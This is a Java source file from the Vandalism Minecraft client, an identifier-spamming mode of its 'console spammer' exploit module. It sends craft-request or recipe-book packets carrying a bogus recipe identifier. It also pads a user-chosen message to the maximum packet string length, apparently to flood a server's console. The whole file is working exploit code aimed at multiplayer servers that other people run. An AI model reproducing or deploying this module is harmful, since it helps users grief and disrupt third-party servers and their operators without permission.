/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, Verschlxfene, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit.consolespammer.impl;

import de.nekosarekawaii.vandalism.base.FabricBootstrap;
import de.nekosarekawaii.vandalism.base.value.impl.number.IntegerValue;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.StringValue;
import de.nekosarekawaii.vandalism.base.value.impl.selection.ModeValue;
import de.nekosarekawaii.vandalism.feature.module.impl.exploit.consolespammer.ConsoleSpammerModule;
import de.nekosarekawaii.vandalism.feature.module.template.ModuleMulti;
import de.nekosarekawaii.vandalism.util.game.InventoryUtil;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.network.packet.c2s.play.RecipeBookDataC2SPacket;
import net.minecraft.util.Identifier;

import java.util.UUID;

public class IdentifierModuleMode extends ModuleMulti<ConsoleSpammerModule> {

    public static final Identifier IDENTIFIER = new Identifier(FabricBootstrap.MOD_ID, UUID.randomUUID().toString().toLowerCase().replace("-", ""));

    private final ModeValue mode = new ModeValue(this, "Mode", "The mode of the identifier spammer.", "CraftRequest", "RecipeBookData");
    private final StringValue message = new StringValue(this, "Message", "The custom message to send.", "hi");
    private final IntegerValue repeat = new IntegerValue(this, "Repeat", "How often the message should be repeated.", 1, 1, Short.MAX_VALUE - 1);

    public IdentifierModuleMode(final ConsoleSpammerModule parent) {
        super("Identifier", parent);
    }

    @Override
    public void onActivate() {
        if (this.mc.getNetworkHandler().getConnection().channel.isActive()) {
            if (mode.getValue().equalsIgnoreCase("CraftRequest")) {
                this.mc.getNetworkHandler().getConnection().channel.writeAndFlush(new CraftRequestC2SPacket(
                        this.mc.player.currentScreenHandler.syncId,
                        InventoryUtil.createDummyRecipeEntry(IDENTIFIER),
                        true
                ));
            } else if (mode.getValue().equalsIgnoreCase("RecipeBookData")) {
                this.mc.getNetworkHandler().getConnection().channel.writeAndFlush(new RecipeBookDataC2SPacket(InventoryUtil.createDummyRecipeEntry(IDENTIFIER)));
            }
        }
        this.parent.deactivate();
    }

    public String consoleString() {
        String text = message.getValue();
        return " " + text.repeat(Math.min(repeat.getValue(), (PacketByteBuf.DEFAULT_MAX_STRING_LENGTH - 1) / text.length()));
    }

}
